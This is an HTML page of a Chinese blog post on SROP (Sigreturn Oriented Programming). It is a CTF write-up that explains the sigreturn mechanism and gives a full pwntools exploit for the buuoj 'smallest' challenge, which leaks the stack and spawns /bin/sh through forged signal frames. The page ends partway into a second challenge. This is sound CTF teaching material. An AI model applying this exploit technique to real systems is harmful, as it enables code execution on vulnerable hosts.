@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="wutong">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://wutong01304.github.io/2023/07/15/srop/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="在之前的文章中，我们介绍了ret2syscall，即控制程序执行系统调用。而SROP就是利用一个名为 sigreturn 的系统调用进行返回导向编程。与ROP相比，SROP具有可重用性，不太依赖于可执行文件的内容，这使得在大量应用程序中重用相同的SROP代码成为可能。除此之外，SROP还适用于不同的指令集体系结构和操作系统。 一、基本原理SROP (Sigreturn Oriented Progr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP">
+<meta property="og:url" content="https://wutong01304.github.io/2023/07/15/SROP/index.html">
+<meta property="og:site_name" content="wutong">
+<meta property="og:description" content="在之前的文章中，我们介绍了ret2syscall，即控制程序执行系统调用。而SROP就是利用一个名为 sigreturn 的系统调用进行返回导向编程。与ROP相比，SROP具有可重用性，不太依赖于可执行文件的内容，这使得在大量应用程序中重用相同的SROP代码成为可能。除此之外，SROP还适用于不同的指令集体系结构和操作系统。 一、基本原理SROP (Sigreturn Oriented Progr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/figure/ProcessOfSignalHandlering.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s1.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s2.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s3.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s4.png?x-oss-process=style/watermark">
+<meta property="og:image" content="f:/%E6%88%91/%E5%B7%A5%E4%BD%9C/blogs/SROP/s5.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s6.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s7.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s8.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s9.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s7.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s10.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s11.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s12.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s13.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s14.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s15.png?x-oss-process=style/watermark">
+<meta property="article:published_time" content="2023-07-15T06:08:30.000Z">
+<meta property="article:modified_time" content="2023-07-19T05:54:04.202Z">
+<meta property="article:author" content="wutong">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Stack">
+<meta property="article:tag" content="SROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/figure/ProcessOfSignalHandlering.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SROP -
+        
+        wutong
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"wutong01304.github.io","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":2,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"static","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"梧桐","subtitle":{"text":["梧桐生矣，于彼朝阳"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/wutong01304","icon":"github"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/7/1 11:45:14"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                wutong
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://github.com/wutong01304"  >
+                                    
+                                        
+                                            <i class="github"></i>
+                                        
+                                        GITHUB
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        target="_blank" rel="noopener" href="https://github.com/wutong01304"  >
+                             
+                                
+                                    <i class="github"></i>
+                                
+                                GITHUB
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROPcover.jpg" alt="SROP" />
+                    <h1 class="article-title-cover">SROP</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">wutong</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-07-15 14:08:30</span>
+        <span class="mobile">2023-07-15 14:08</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-07-19 13:54:04</span>
+            <span class="mobile">2023-07-19 13:54</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Stack/">Stack</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SROP/">SROP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <p>在之前的文章中，我们介绍了<a href="https://wutong01304.github.io/2023/07/11/ret2syscall/">ret2syscall</a>，即控制程序执行系统调用。而SROP就是利用一个名为 sigreturn 的系统调用进行返回导向编程。与ROP相比，SROP具有可重用性，不太依赖于可执行文件的内容，这使得在大量应用程序中重用相同的SROP代码成为可能。除此之外，SROP还适用于不同的指令集体系结构和操作系统。</p>
+<h1 id="一、基本原理"><a href="#一、基本原理" class="headerlink" title="一、基本原理"></a>一、基本原理</h1><p>SROP (Sigreturn Oriented Programming) 于2014年[1]被提出。</p>
+<p>[1]Bosman E, Bos H. Framing signals-a return to portable shellcode[C]&#x2F;&#x2F;2014 IEEE Symposium on Security and Privacy. IEEE, 2014: 243-258.</p>
+<p>文章的主要贡献如下：</p>
+<ol>
+<li>提出了一种新的通用开发技术，称为面向sigreturn的编程（SROP），在某些情况下，它不需要事先了解受害者应用程序，并产生可重复使用的“shell代码”；</li>
+<li>提出了 一种基于SROP的新型隐身后门技术</li>
+<li>给出绕过苹果 iOS 安全模型的系统调用代理示例</li>
+<li>证明了SROP是图灵完备的；</li>
+<li>提出了可能的缓解技术。</li>
+</ol>
+<p>首先我们需要了解什么是sigreturn？</p>
+<p>sigreturn是一个与信号处理相关的系统调用，用于将控制权从信号处理程序中恢复到被中断的进程。当一个进程接收到一个信号时，系统会将控制权转移到信号处理程序，该程序可以执行一些特定的操作，例如打印日志或修改进程状态。在信号处理程序执行完成后，进程需要恢复执行被中断的程序。这时，可以使用sigreturn系统调用来将控制权从信号处理程序中返回。如图所示：</p>
+<p>图片来源于<a class="link"   target="_blank" rel="noopener" href="https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/advanced_rop/#srop" >https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/advanced_rop/#srop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/figure/ProcessOfSignalHandlering.png"
+                     
+                ></p>
+<p>当系统进程发起（deliver）一个 signal 的时候，该进程会被短暂的挂起（suspend），进入内核①，然后内核对该进程保留相应的上下文，跳转到之前注册好的 signal handler 中处理 signal②，当 signal 返回后③，内核为进程恢复之前保留的上下文，恢复进程的执行④。</p>
+<p>内核为进程保留相应的上下文的方法主要是：将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址，此时栈的情况是这样的：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s1.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>我们称 ucontext 以及 siginfo 这一段为 signal frame，需要注意的是这一部分是在用户进程的地址空间，之后会跳转到注册过 signal handler 中处理相应的 signal，因此，当 signal handler 执行完成后就会执行 sigreturn 系统调用来恢复上下文，因此我们可以利用之前压入的寄存器的内容，在系统回复进程执行时，对应的寄存器就会还原成我们构造的寄存器内容。</p>
+<p>32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15。</p>
+<h1 id="二、攻击过程"><a href="#二、攻击过程" class="headerlink" title="二、攻击过程"></a>二、攻击过程</h1><p>题目：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#360chunqiu2017_smallest" >https://buuoj.cn/challenges#360chunqiu2017_smallest <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
+<p>反汇编发现，只有下面这些代码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s2.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>xor rax,rax，将rax寄存器的内容与自己异或，也就是为0<br>mov edx 400h  mov rsi rsp  mov rdi rax，就是syscall用到的参数。</p>
+<table>
+<thead>
+<tr>
+<th align="center">系统调用</th>
+<th align="center">调用号</th>
+<th>函数原型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">read</td>
+<td align="center">0</td>
+<td>read(int fd, void *buf, size_t count)</td>
+</tr>
+<tr>
+<td align="center">write</td>
+<td align="center">1</td>
+<td>write(int fd, const void *buf, size_t count)</td>
+</tr>
+<tr>
+<td align="center">sigreturn</td>
+<td align="center">15</td>
+<td>int sigreturn(…)</td>
+</tr>
+<tr>
+<td align="center">execve</td>
+<td align="center">59</td>
+<td>execve(const char *filename, char *const argv[],char *const envp[])</td>
+</tr>
+</tbody></table>
+<p>syscall 调用的是 rax 的 0，所以这里就是 syscall(0,0,$rsp,0x400) 所以程序实际执行的是 read(0,$rsp,0x400)，也就是往栈顶写 0x400 字节的内容。SROP 主要是利用了第 15 号sigreturn 从栈上读取数据，赋值到寄存器中，然后构造 syscall(59,”&#x2F;bin&#x2F;sh”,0,0)。</p>
+<p>值得注意的是，尽管我们可以利用rsp将start地址写入栈，但是无法利用rsp控制栈。因此为了控制栈，我们需要得到栈地址，也就是使用write函数，将栈地址打印出来。然后再构造sigreturn，利用sigreturn执行我们自己构造的函数。</p>
+<h2 id="2-1-多次利用syscall"><a href="#2-1-多次利用syscall" class="headerlink" title="2.1 多次利用syscall"></a>2.1 <strong>多次利用syscall</strong></h2><p>如图所示，执行syscall前，esp&#x3D;0x7fffffffe590（图1），输入1234，执行后，esp被放入1234（图2），执行ret后，esp下移一位，即0x7fffffffe598（图3）。如果我们输入的不是1234而是一个地址时，就会跳转到这个地址去执行。</p>
+<p>图1：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s3.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>图2：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s4.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>图3：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/%E6%88%91/%E5%B7%A5%E4%BD%9C/blogs/SROP/s5.png"
+                     
+                ></p>
+<p>因此若我们将栈顶写为start_addr的地址时，syscall就会再次执行，若输入多个start_addr时，就会多次执行syscall。按需求，我们使用system一次性发送三个start_addr，如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s6.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>算上发送这三个start_addr的地址syscall(read)，syscall将会被执行四次。</p>
+<h2 id="2-2-构造write"><a href="#2-2-构造write" class="headerlink" title="2.2 构造write"></a>2.2 <strong>构造write</strong></h2><p>利用rax，使调用号为1，调用write。</p>
+<p>read函数如果读取成功，就会返回实际读到的字节数，并存进rax寄存器（大多数函数的返回值都由rax寄存器控制），因此，我们可以利用第一个start_addr执行，输入一个字符，将rax寄存器置为1，这样再一次执行syscall的时候，执行的就是write函数了。</p>
+<p>但是，第一条指令为xor rax,rax，会修改寄存器，因此为了防止rax寄存器被改变，我们输入’x\b3’字符，使得第2个start_addr的0x4000B0的后两位’B0’被修改为’B3，也就是第2行mov rdx,400h的地址0x4000B3。这样，当syscall执行后，就会返回到0x4000B3执行，跳过异或rax的指令。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s7.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>当转到第2个start_addr\b3执行，write函数会从rsp位置开始读取长度为0x400的数据。因此我们可以知道栈地址是多少，由于此时rsp指向第3个stack_addr，此时我们可以利用的栈首地址为8字节之后，即stack_addr &#x3D; u64(sh.recv()[8:16])。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s8.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<h2 id="2-3-构造sigreturn"><a href="#2-3-构造sigreturn" class="headerlink" title="2.3 构造sigreturn"></a>2.3 构造sigreturn</h2><p>write执行完以后，会返回到第3个start_addr地址执行，也就是再次调用syscall(read)，此时将我们的payload发出，就会被写入栈了，然后就可以构造sigreturn了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s9.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>]= syscall_ret + ****(add to <span class="number">15</span>)<span class="comment">#第2段payload不会改变原来的payload</span></span><br></pre></td></tr></table></figure></div>
+
+<p>为了使程序接着执行，我们将paylade的前8个字节构造为start_addr。即payload发送以后，会再次执行start_addr，也就是syscall(read)，此时我们输入15个字符使其rdx&#x3D;15，为调用sigreturn做准备。然后会转到syscall_ret执行，也就是0x4000BE，此时rdx为15，执行syscall就是执行sigreturn。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s7.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>sigreturn会触发中断，将我们构造好的read函数参数（栈中的）给放到寄存器上（会清除栈里面的read_frame），然后执行read函数，等待接收。</p>
+<h2 id="2-4-构造-execve"><a href="#2-4-构造-execve" class="headerlink" title="2.4 构造 execve"></a>2.4 构造 execve</h2><p>此时，再次输入payload，将payload写入栈。由于我们设置esp（返回地址）是syscall_ret，中断执行完后会调用syscall 15，即read函数，而设置的read函数参数为stack_addr，即会将接收到的数据写入stack_addr的地址，之前的栈空间会被覆盖。</p>
+<p>同样，为了使得程序继续执行，我们将第一个地址构造成start_addr，为了执行execve，我们需要再次触发中断，第2个地址同样构造为syscall_ret。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s10.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(start_addr)+p64(syscall_ret)+<span class="built_in">str</span>(execve)</span><br><span class="line">payload=payload+(<span class="number">0x120</span>-<span class="built_in">len</span>(payload ))*<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span>(补到<span class="number">120</span>字符，并加上/<span class="built_in">bin</span>/sh)</span><br><span class="line">payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>]= syscall_ret + ****(add to <span class="number">15</span>)<span class="comment">#第2段payload不会改变原来的payload</span></span><br></pre></td></tr></table></figure></div>
+
+<p>当再次触发中断时，会将execve函数参数放到寄存器中，由于我们将esp即中断的返回地址设为syscall_ret，所以当它返回时，就会调用execve（syscall 59），而execve参数的位置为stack_addr+120。因此当execve执行时，会调用&#x2F;bin&#x2F;sh（rdi&#x3D;stack_addr+20的位置），执行shell。</p>
+<p>完整exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27207</span>)</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">syscall_ret = <span class="number">0x004000BE</span></span><br><span class="line">start_addr = <span class="number">0x004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">sh.send(payload)<span class="comment">#首先,发送start_addr的地址,因为是写在栈顶的,所以就是read的返回地址，会返回到start_addr</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line"><span class="comment">#返回后再次调用read函数的时候输入一个字节,read函数会把读入的字节数放到rax，达到了rax置为1</span></span><br><span class="line"><span class="comment">#同时会把rsp的后一位写为\xB3,这样返回地址就不是start_addr了，而是4000B3,这就避免了rax被xor置零</span></span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))<span class="comment">#现拿到栈的地址</span></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read</span><br><span class="line">read.rdi = <span class="number">0</span></span><br><span class="line">read.rsi = stack_addr</span><br><span class="line">read.rdx = <span class="number">0x400</span></span><br><span class="line">read.rsp = stack_addr</span><br><span class="line">read.rip = syscall_ret <span class="comment">#相当于read(0,stack_addr,0x400),同时返回地址是start_addr</span></span><br><span class="line">read_frame_payload  = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">sh.send(read_frame_payload)<span class="comment">#调用read函数,等待接收</span></span><br><span class="line">sh.send(read_frame_payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])<span class="comment">#总共是15个，使得rax为15</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax=constants.SYS_execve</span><br><span class="line">execve.rdi=stack_addr + <span class="number">0x120</span></span><br><span class="line">execve.rsi=<span class="number">0x0</span></span><br><span class="line">execve.rdx=<span class="number">0x0</span></span><br><span class="line">execve.rsp=stack_addr</span><br><span class="line">execve.rip=syscall_ret</span><br><span class="line">execv_frame_payload=p64(start_addr)+p64(syscall_ret)+<span class="built_in">str</span>(execve)<span class="comment">#返回start_addr等待输入</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(execv_frame_payload)</span><br><span class="line">execv_frame_payload_all=execv_frame_payload+(<span class="number">0x120</span>-<span class="built_in">len</span>(execv_frame_payload ))*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span><span class="comment">#填充到0x120，然后再填上&#x27;/bin/sh&#x27;</span></span><br><span class="line">sh.send(execv_frame_payload_all)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.send(execv_frame_payload_all[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>成功拿到flag:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s11.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<h2 id="2-5-一道简单的例题"><a href="#2-5-一道简单的例题" class="headerlink" title="2.5 一道简单的例题"></a>2.5 一道简单的例题</h2><p>题目：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_s_3" >https://buuoj.cn/challenges#ciscn_2019_s_3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p>反汇编观察vuln函数：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s12.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<ul>
+<li>proc定义子程序的伪指令,它和endp 分别表示子程序定义的开始和结束两者必须成对出现。</li>
+<li>var存储字节的数组，长度为0x10</li>
+<li>xor rax rax，异或操作，将rax寄存器置为0。</li>
+<li>mov edx, 400h 将edx寄存器的值设置为了0x400</li>
+<li>lea rsi, [rsp+var_10] 将rsp+var_10的地址传入寄存器rsi</li>
+<li>mov rdi, rax，将rax寄存器的值（也就是0）传给rdi</li>
+</ul>
+<p>因此，第一个syscall也就相当于read(0,var,400h)，即这里可以溢出，溢出大小为0x10。类似地。第二个syscall也就相当于write(1,var,30h)，将var地址输出。</p>
+<p>我们的思路是，通过触发系统中断sigreturn，设置寄存器的值，使其调用execve（‘bin&#x2F;sh,0,0）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s13.png?x-oss-process=style/watermark"
+                     
+                ></p>
